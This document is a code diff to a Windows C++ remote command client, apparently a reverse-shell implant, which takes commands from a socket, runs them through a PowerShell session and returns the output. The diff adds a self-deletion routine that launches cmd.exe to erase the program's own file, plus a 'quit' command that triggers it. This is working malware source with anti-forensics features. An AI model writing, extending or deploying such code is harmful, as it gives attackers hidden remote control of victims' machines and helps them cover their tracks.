@@ -1,11 +1,21 @@
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <windows.h>
-#include <iostream>
-#include <string>
+
 #include "PowerShellSession.hpp"
 
-#pragma comment(lib, "ws2_32.lib")
+VOID SelfDelete() {
+    CHAR carrSelfPath[MAX_PATH];
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+
+    GetModuleFileNameA(NULL, carrSelfPath, MAX_PATH);
+    std::string szCmdLine = "cmd.exe /C timeout /t 1 >nul & del \"" + std::string(carrSelfPath) + "\"";
+    CreateProcessA(NULL, (LPSTR)szCmdLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+
 VOID PrependStringSize(std::string szData, std::string& szOutput) {
     uint32_t uiNetMessageLen;
 
@@ -37,20 +47,34 @@ VOID SendComputerName(SOCKET sock) {
 
 VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
+    BOOL bIsRunning;
     CHAR carrRecvbuf[MAX_BUFFER_SIZE];
     std::string szCwd;
     std::string szFinalData;
     std::string szCommandOutput;
 
-    while ((iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0)) > 0) {
+    bIsRunning = TRUE;
+
+    while (bIsRunning) {
+        iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0);
+        
+        if (iBytesReceived < 0) {
+            break;
+        }
+
         carrRecvbuf[iBytesReceived] = '\0';
-        std::string command(carrRecvbuf);
+        std::string szCommand(carrRecvbuf);
+        std::cout << "[+] Received command: " << szCommand << "\n";
 
-        std::cout << "[+] Received command: " << command << "\n";
-        szCommandOutput = psSession.RunCommand(command);
-
-        PrependStringSize(szCommandOutput, szFinalData);
-        send(socket, szFinalData.data(), szFinalData.length(), 0);
+        if (szCommand == "quit") {
+            bIsRunning = FALSE;
+            SelfDelete();
+        }
+        else {
+            szCommandOutput = psSession.RunCommand(szCommand);
+            PrependStringSize(szCommandOutput, szFinalData);
+            send(socket, szFinalData.data(), szFinalData.length(), 0);
+        }
     }
 }
 
